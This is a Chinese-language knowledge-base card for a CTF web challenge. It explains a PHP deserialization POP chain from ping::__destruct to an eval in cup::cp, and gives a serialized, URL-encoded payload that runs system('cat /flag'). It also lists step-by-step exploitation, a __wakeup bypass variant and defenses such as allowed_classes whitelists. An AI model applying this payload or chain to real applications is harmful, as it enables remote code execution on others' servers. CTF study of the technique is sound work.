---
id: web-php-deserialization-destruct-cup-eval-pop
title: 简单 POP 链：ping::__destruct 调 cup::cp eval 执行 system('cat /flag')
type: scenario
domain: web
path: web/php/deserialization
technique: php-destruct-method-eval-pop
aliases:
- 武功山杯 石能为鼓
- ping cup POP 链
- __destruct 调 cp
- eval 反序列化
tags:
- php
- deserialization
- pop-chain
- destruct
- eval
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:21:49+08:00'
  notes: 已对照原文与全部25张图核对：unserialize(['d'])、ping::__destruct→->xiang->cp()→cup::cp() eval(->data)（图07）、序列化payload与URL编码串（O:4:ping protected xiang=cup、private data=system('cat /flag');）均一致且长度正确。图07为题目源码（__construct=new fun()），文字给了利用版类定义，卡内以利用链为准。未验证点：未实际请求目标。
---

## 一句话结论

入口 `unserialize($_GET['d'])`，`ping::__destruct()` 调用 `$this->xiang->cp()`，而 `cup::cp()` 执行 `eval($this->data)`；构造 `ping` 对象的 protected `xiang` 属性为 `cup` 对象、`cup` 的 private `data` 为 `system('cat /flag');`，反序列化后在请求结束析构时自动 eval 执行命令。

## 原理

- `unserialize()` 用户输入直接反序列化，攻击者控制对象图。
- `ping::__destruct` 在对象销毁时调用 `$this->xiang->cp()`；把 `xiang` 设为 `cup` 实例即可调用其 `cp()`。
- `cup::cp()` 执行 `eval($this->data)`，`data` 为 private 属性，序列化名 `\0cup\0data`；protected 属性名 `\0*\0xiang`。
- PHP 反序列化不调用 `__construct`，但会按序列化串恢复属性；析构在脚本结束时触发。

## 触发条件

- 用户可控 `unserialize()` 输入（本例 `$_GET['d']`）。
- 代码中存在 `__destruct` 转发到 `eval`/命令执行的类链。
- 无类名白名单/签名校验。

## 利用步骤

1. 审计类定义，确认 `ping::__destruct → cup::cp → eval($data)`。
2. 构造 payload：`O:4:"ping":1:{s:8:"\0*\0xiang";O:3:"cup":1:{s:9:"\0cup\0data";s:20:"system('cat /flag');";}}`。
3. URL 编码后作为 `d` 参数提交。
4. 请求结束时析构触发 eval，命令输出回显。

## PoC

```
O%3A4%3A%22ping%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00xiang%22%3BO%3A3%3A%22cup%22%3A1%3A%7Bs%3A9%3A%22%00cup%00data%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D
```

## 变体与关联

- 通用魔术方法链：`__destruct` 起点、`__toString/__get/__call/__invoke` 中转、`eval`/文件读取 sink。
- 可结合 `__wakeup` 属性数绕过。

## 检测与防御

- 不对用户输入使用 `unserialize()`；使用 JSON 等安全格式。
- 必须反序列化时使用 `allowed_classes` 白名单、签名/HMAC 校验。
- 禁止在魔术方法中执行 `eval`/命令。
